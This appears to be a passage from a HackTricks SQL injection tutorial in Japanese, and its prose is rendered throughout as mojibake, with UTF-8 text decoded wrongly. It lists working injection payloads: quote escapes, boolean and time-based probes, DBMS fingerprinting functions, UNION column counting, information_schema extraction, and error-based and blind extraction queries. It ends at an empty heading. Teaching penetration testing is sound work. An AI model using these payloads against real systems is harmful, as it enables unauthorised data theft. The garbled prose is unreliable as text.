# SQL ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ã§ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong></a><strong>ï¼</strong></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricks ã§ä¼æ¥­ã‚’å®£ä¼**ã—ã¦ã¿ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASS ã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricks ã‚’ PDF ã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã¾ã™
* [**å…¬å¼ã® PEASS & HackTricks ã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com) ã‚’æ‰‹ã«å…¥ã‚Œã¾ã™
* **[ğŸ’¬](https://emojipedia.org/speech-balloon/) Discord ã‚°ãƒ«ãƒ¼ãƒ—**ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegram ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)** ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¾ã™**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[hacktricks ãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks) ã¨ [hacktricks-cloud ãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)** ã« PR ã‚’æå‡ºã—ã¾ã™

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) ã¯ **ã‚¹ãƒšã‚¤ãƒ³** ã§æœ€ã‚‚é–¢é€£æ€§ã®é«˜ã„ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ™ãƒ³ãƒˆã§ã‚ã‚Šã€**ãƒ¨ãƒ¼ãƒ­ãƒƒãƒ‘** ã§ã‚‚æœ€ã‚‚é‡è¦ãªã‚¤ãƒ™ãƒ³ãƒˆã®1ã¤ã§ã™ã€‚**æŠ€è¡“çš„çŸ¥è­˜ã®ä¿ƒé€²ã‚’ä½¿å‘½**ã¨ã™ã‚‹ã“ã®ä¼šè­°ã¯ã€ã‚ã‚‰ã‚†ã‚‹åˆ†é‡ã®ãƒ†ã‚¯ãƒãƒ­ã‚¸ãƒ¼ã¨ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å°‚é–€å®¶ã®ç†±ã„å‡ºä¼šã„ã®å ´ã§ã™ã€‚

{% embed url="https://www.rootedcon.com/" %}

## SQL ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¨ã¯ï¼Ÿ

**SQL ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³**ã¯ã€æ”»æ’ƒè€…ãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚¯ã‚¨ãƒªã« **å¹²æ¸‰** ã§ãã‚‹ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®è„†å¼±æ€§ã§ã™ã€‚ã“ã®è„†å¼±æ€§ã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ã€ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æƒ…å ±ã‚„ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ãƒ‡ãƒ¼ã‚¿ã‚’å«ã‚€ã€ã‚¢ã‚¯ã‚»ã‚¹ã™ã¹ãã§ãªã„ãƒ‡ãƒ¼ã‚¿ã‚’ **è¡¨ç¤º**ã€**å¤‰æ›´**ã€ã¾ãŸã¯ **å‰Šé™¤** ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã‚‰ã®è¡Œå‹•ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®æ©Ÿèƒ½ã‚„ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®æ°¸ç¶šçš„ãªå¤‰æ›´ã€ã¾ãŸã¯ã‚µãƒ¼ãƒãƒ¼ã®ä¾µå®³ã‚„ã‚µãƒ¼ãƒ“ã‚¹ã®æ‹’å¦ã•ãˆã‚‚å¼•ãèµ·ã“ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

## ã‚¨ãƒ³ãƒˆãƒªãƒ¼ãƒã‚¤ãƒ³ãƒˆã®æ¤œå‡º

ã‚µã‚¤ãƒˆãŒ **SQL ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆSQLiï¼‰** ã«è„†å¼±ã§ã‚ã‚‹ã‚ˆã†ã«è¦‹ãˆã‚‹å ´åˆã€SQLi é–¢é€£ã®å…¥åŠ›ã«å¯¾ã™ã‚‹ã‚µãƒ¼ãƒãƒ¼ã®ç•°å¸¸ãªå¿œç­”ã«ã‚ˆã‚Šã€**æœ€åˆã®ã‚¹ãƒ†ãƒƒãƒ—** ã¯ã€ã‚¯ã‚¨ãƒªã«ãƒ‡ãƒ¼ã‚¿ã‚’ **æŒ¿å…¥ã™ã‚‹æ–¹æ³•ã‚’ç†è§£ã—ã€ãã‚Œã‚’å¦¨ã’ã‚‹ã“ã¨ãªã** è¡Œã†ã“ã¨ã§ã™ã€‚ã“ã‚Œã«ã¯ã€ç¾åœ¨ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‹ã‚‰ **åŠ¹æœçš„ã«è„±å‡ºã™ã‚‹æ–¹æ³•** ã‚’ç‰¹å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
ä»¥ä¸‹ã¯ã€ã„ãã¤ã‹ã®æœ‰ç”¨ãªä¾‹ã§ã™ï¼š
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
æ¬¡ã«ã€**ã‚¯ã‚¨ãƒªã‚’ä¿®æ­£ã—ã¦ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ãªã„ã‚ˆã†ã«ã™ã‚‹æ–¹æ³•**ã‚’çŸ¥ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã‚¯ã‚¨ãƒªã‚’ä¿®æ­£ã™ã‚‹ãŸã‚ã«ã¯ã€æ–°ã—ã„ãƒ‡ãƒ¼ã‚¿ã‚’**å…¥åŠ›**ã—ã¦ã€**ä»¥å‰ã®ã‚¯ã‚¨ãƒªãŒæ–°ã—ã„ãƒ‡ãƒ¼ã‚¿ã‚’å—ã‘å…¥ã‚Œã‚‹ã‚ˆã†ã«**ã™ã‚‹ã‹ã€å˜ã«**ãƒ‡ãƒ¼ã‚¿ã‚’å…¥åŠ›**ã—ã¦**ã‚³ãƒ¡ãƒ³ãƒˆè¨˜å·ã‚’æœ«å°¾ã«è¿½åŠ **ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

_ã‚¯ã‚¨ãƒªãŒæ©Ÿèƒ½ã—ã¦ã„ã‚‹ã¨ãã¨æ©Ÿèƒ½ã—ã¦ã„ãªã„ã¨ãã«ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã€é•ã„ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹å ´åˆã€ã“ã®ãƒ•ã‚§ãƒ¼ã‚ºã¯ã‚ˆã‚Šç°¡å˜ã«ãªã‚Šã¾ã™ã€‚_

### **ã‚³ãƒ¡ãƒ³ãƒˆ**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### è«–ç†æ¼”ç®—ã§ç¢ºèª

SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ã‚’ç¢ºèªã™ã‚‹ä¿¡é ¼æ€§ã®é«˜ã„æ–¹æ³•ã¯ã€**è«–ç†æ¼”ç®—**ã‚’å®Ÿè¡Œã—ã€æœŸå¾…ã•ã‚Œã‚‹çµæœã‚’è¦³å¯Ÿã™ã‚‹ã“ã¨ã§ã™ã€‚ãŸã¨ãˆã°ã€`?username=Peter`ã¨ã„ã†GETãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒ`?username=Peter' or '1'='1`ã«å¤‰æ›´ã•ã‚ŒãŸã¨ãã«åŒä¸€ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãŒç”Ÿæˆã•ã‚Œã‚‹å ´åˆã€SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ãŒç¤ºå”†ã•ã‚Œã¾ã™ã€‚

åŒæ§˜ã«ã€**æ•°å­¦æ¼”ç®—**ã®é©ç”¨ã¯åŠ¹æœçš„ãªç¢ºèªæ‰‹æ³•ã¨ã—ã¦æ©Ÿèƒ½ã—ã¾ã™ã€‚ãŸã¨ãˆã°ã€`?id=1`ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸå ´åˆã¨`?id=2-1`ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸå ´åˆã«åŒã˜çµæœãŒç”Ÿæˆã•ã‚Œã‚‹å ´åˆã€SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®å…†å€™ã¨ãªã‚Šã¾ã™ã€‚

è«–ç†æ¼”ç®—ã«ã‚ˆã‚‹ç¢ºèªã‚’ç¤ºã™ä¾‹ï¼š
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
ã“ã®ãƒ¯ãƒ¼ãƒ‰ãƒªã‚¹ãƒˆã¯ã€ææ¡ˆã•ã‚ŒãŸæ–¹æ³•ã§SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’**ç¢ºèª**ã—ã‚ˆã†ã¨ä½œæˆã•ã‚Œã¾ã—ãŸï¼š

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### ã‚¿ã‚¤ãƒŸãƒ³ã‚°ã§ã®ç¢ºèª

å ´åˆã«ã‚ˆã£ã¦ã¯ã€ãƒ†ã‚¹ãƒˆã—ã¦ã„ã‚‹ãƒšãƒ¼ã‚¸ã«**å¤‰åŒ–ã«æ°—ã¥ã‹ãªã„**ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ãã®ãŸã‚ã€**ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹**ã™ã‚‹è‰¯ã„æ–¹æ³•ã¯ã€DBã«ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã•ã›ã€ãƒšãƒ¼ã‚¸ã®èª­ã¿è¾¼ã¿ã«**æ™‚é–“ãŒã‹ã‹ã‚‹å½±éŸ¿**ã‚’ä¸ãˆã‚‹ã“ã¨ã§ã™ã€‚\
ã—ãŸãŒã£ã¦ã€SQLã‚¯ã‚¨ãƒªã«ã€å®Œäº†ã«å¤šãã®æ™‚é–“ãŒã‹ã‹ã‚‹æ“ä½œã‚’é€£çµã—ã¾ã™ï¼š
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
ã„ãã¤ã‹ã®å ´åˆã€**sleepé–¢æ•°ã‚’è¨±å¯ã•ã‚Œãªã„**ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ãã®å ´åˆã€ã“ã‚Œã‚‰ã®é–¢æ•°ã‚’ä½¿ç”¨ã™ã‚‹ä»£ã‚ã‚Šã«ã€**è¤‡é›‘ãªæ“ä½œã‚’å®Ÿè¡Œ**ã•ã›ã‚‹ã“ã¨ã§ã€æ•°ç§’ã‹ã‹ã‚‹ã‚¯ã‚¨ãƒªã‚’ä½œæˆã§ãã¾ã™ã€‚_ã“ã‚Œã‚‰ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã®ä¾‹ã¯ã€å„æŠ€è¡“ã”ã¨ã«åˆ¥ã€…ã«ã‚³ãƒ¡ãƒ³ãƒˆã•ã‚Œã¾ã™_ã€‚

### ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã®ç‰¹å®š

ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã‚’ç‰¹å®šã™ã‚‹æœ€è‰¯ã®æ–¹æ³•ã¯ã€ç•°ãªã‚‹ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã®é–¢æ•°ã‚’å®Ÿè¡Œã—ã‚ˆã†ã¨ã™ã‚‹ã“ã¨ã§ã™ã€‚å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã®**sleepé–¢æ•°**ã¾ãŸã¯ã“ã‚Œã‚‰ã®é–¢æ•°ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼ˆ[payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification)ã‹ã‚‰ã®ãƒ†ãƒ¼ãƒ–ãƒ«ã‚’ä½¿ç”¨ï¼‰:
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
ã¾ãŸã€ã‚¯ã‚¨ãƒªã®å‡ºåŠ›ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆã¯ã€**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’è¡¨ç¤ºã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚

{% hint style="info" %}
ç¶šã‘ã¦ã€ç•°ãªã‚‹ç¨®é¡ã®SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®ç•°ãªã‚‹æ–¹æ³•ã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã™ã€‚ä¾‹ã¨ã—ã¦MySQLã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
{% endhint %}

### PortSwiggerã‚’ä½¿ç”¨ã—ãŸè­˜åˆ¥

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## Union Basedã®æ‚ªç”¨

### åˆ—ã®æ•°ã‚’æ¤œå‡ºã™ã‚‹

ã‚¯ã‚¨ãƒªã®å‡ºåŠ›ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã‚‹å ´åˆã€ã“ã‚ŒãŒæ‚ªç”¨ã™ã‚‹æœ€è‰¯ã®æ–¹æ³•ã§ã™ã€‚\
ã¾ãšã€**åˆæœŸãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ãŒè¿”ã™**åˆ—ã®æ•°**ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯**ä¸¡æ–¹ã®ã‚¯ã‚¨ãƒªãŒåŒã˜åˆ—ã®æ•°ã‚’è¿”ã™å¿…è¦ãŒã‚ã‚‹ãŸã‚**ã§ã™ã€‚\
é€šå¸¸ã€ã“ã®ç›®çš„ã®ãŸã‚ã«ã¯2ã¤ã®æ–¹æ³•ãŒä½¿ç”¨ã•ã‚Œã¾ã™:

#### Order/Group by

ã‚¯ã‚¨ãƒªå†…ã®åˆ—ã®æ•°ã‚’ç‰¹å®šã™ã‚‹ã«ã¯ã€**ORDER BY**ã¾ãŸã¯**GROUP BY**å¥ã§ä½¿ç”¨ã•ã‚Œã‚‹æ•°ã‚’æ®µéšçš„ã«èª¿æ•´ã—ã€å½ã®å¿œç­”ãŒå—ä¿¡ã•ã‚Œã‚‹ã¾ã§å¢—ã‚„ã—ã¾ã™ã€‚SQLå†…ã®**GROUP BY**ã¨**ORDER BY**ã®ç•°ãªã‚‹æ©Ÿèƒ½ã«ã‚‚ã‹ã‹ã‚ã‚‰ãšã€ã‚¯ã‚¨ãƒªã®åˆ—æ•°ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ä¸¡æ–¹ã‚’åŒæ§˜ã«åˆ©ç”¨ã§ãã¾ã™ã€‚
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

ã‚¯ã‚¨ãƒªãŒæ­£ã—ã„å€¤ã‚’è¿”ã™ã¾ã§ã€ã•ã‚‰ã«å¤šãã® null å€¤ã‚’é¸æŠã—ã¾ã™ï¼š
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_ã„ãã¤ã‹ã®ã‚±ãƒ¼ã‚¹ã§ã¯ã€ã‚¯ã‚¨ãƒªã®ä¸¡å´ã®åˆ—ã®å‹ãŒåŒã˜ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚‹ãŸã‚ã€`null`å€¤ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚`null`ã¯ã™ã¹ã¦ã®ã‚±ãƒ¼ã‚¹ã§æœ‰åŠ¹ã§ã™ã€‚_

### ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹åã€ãƒ†ãƒ¼ãƒ–ãƒ«åã€åˆ—åã‚’æŠ½å‡º

æ¬¡ã®ä¾‹ã§ã¯ã€ã™ã¹ã¦ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®åå‰ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ãƒ†ãƒ¼ãƒ–ãƒ«åã€ãƒ†ãƒ¼ãƒ–ãƒ«ã®åˆ—åã‚’å–å¾—ã—ã¾ã™ï¼š
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_ç•°ãªã‚‹ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã”ã¨ã«ã“ã®ãƒ‡ãƒ¼ã‚¿ã‚’ç™ºè¦‹ã™ã‚‹æ–¹æ³•ã¯ç•°ãªã‚Šã¾ã™ãŒã€å¸¸ã«åŒã˜æ–¹æ³•è«–ã§ã™ã€‚_

## éš ã‚ŒãŸ Union Based ã®æ‚ªç”¨

ã‚¯ã‚¨ãƒªã®å‡ºåŠ›ãŒè¦‹ãˆã‚‹ãŒã€union-based injection ãŒé”æˆä¸å¯èƒ½ã«è¦‹ãˆã‚‹å ´åˆã€**éš ã‚ŒãŸ union-based injection** ã®å­˜åœ¨ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚ã“ã®ã‚·ãƒŠãƒªã‚ªã¯ã—ã°ã—ã° blind injection ã®çŠ¶æ³ã«ã¤ãªãŒã‚Šã¾ã™ã€‚blind injection ã‚’ union-based ã«å¤‰æ›ã™ã‚‹ã«ã¯ã€ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã§ã®å®Ÿè¡Œã‚¯ã‚¨ãƒªã‚’è­˜åˆ¥ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã‚Œã¯ã€ç›®æ¨™ã¨ã™ã‚‹ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ç®¡ç†ã‚·ã‚¹ãƒ†ãƒ ï¼ˆDBMSï¼‰ã«å›ºæœ‰ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ†ãƒ¼ãƒ–ãƒ«ã¨å…±ã« blind injection ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã¦é”æˆã§ãã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ†ãƒ¼ãƒ–ãƒ«ã‚’ç†è§£ã™ã‚‹ãŸã‚ã«ã¯ã€å¯¾è±¡ã®DBMSã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’å‚ç…§ã™ã‚‹ã“ã¨ãŒæ¨å¥¨ã•ã‚Œã¾ã™ã€‚

ã‚¯ã‚¨ãƒªã‚’æŠ½å‡ºã—ãŸã‚‰ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’èª¿æ•´ã—ã¦å…ƒã®ã‚¯ã‚¨ãƒªã‚’å®‰å…¨ã«é–‰ã˜ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã®å¾Œã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã« union ã‚¯ã‚¨ãƒªã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§ã€æ–°ãŸã«ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã«ãªã£ãŸ union-based injection ã‚’æ‚ªç”¨ã§ãã¾ã™ã€‚

ã‚ˆã‚ŠåŒ…æ‹¬çš„ãªæ´å¯Ÿã‚’å¾—ã‚‹ã«ã¯ã€[Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f) ã§åˆ©ç”¨å¯èƒ½ãªå®Œå…¨ãªè¨˜äº‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

## ã‚¨ãƒ©ãƒ¼ã‚’åˆ©ç”¨ã—ãŸæ‚ªç”¨

ä½•ã‚‰ã‹ã®ç†ç”±ã§ **ã‚¯ã‚¨ãƒªã®å‡ºåŠ›** ã‚’ **è¦‹ã‚‹ã“ã¨ãŒã§ããªã„** ãŒã€**ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã‚‹** å ´åˆã€ã“ã‚Œã‚‰ã®ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’ä½¿ç”¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰ãƒ‡ãƒ¼ã‚¿ã‚’ **å¤–éƒ¨ã«æŒã¡å‡ºã™** ã“ã¨ãŒã§ãã¾ã™ã€‚\
Union Based ã®æ‚ªç”¨ã¨åŒæ§˜ã®æµã‚Œã«å¾“ã†ã“ã¨ã§ã€DB ã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## Blind SQLiã®æ‚ªç”¨

ã“ã®å ´åˆã€ã‚¯ã‚¨ãƒªã®çµæœã‚„ã‚¨ãƒ©ãƒ¼ã‚’è¦‹ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ãŒã€ã‚¯ã‚¨ãƒªãŒ**true**ã¾ãŸã¯**false**ã®å¿œç­”ã‚’è¿”ã™ã¨ãã«åŒºåˆ¥ã§ãã¾ã™ã€‚ãªãœãªã‚‰ã€ãƒšãƒ¼ã‚¸ã«ã¯ç•°ãªã‚‹ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã‹ã‚‰ã§ã™ã€‚\
ã“ã®å ´åˆã€ãã®å‹•ä½œã‚’æ‚ªç”¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’1æ–‡å­—ãšã¤ãƒ€ãƒ³ãƒ—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## ã‚¨ãƒ©ãƒ¼ç›²ç›®SQLiã®æ‚ªç”¨

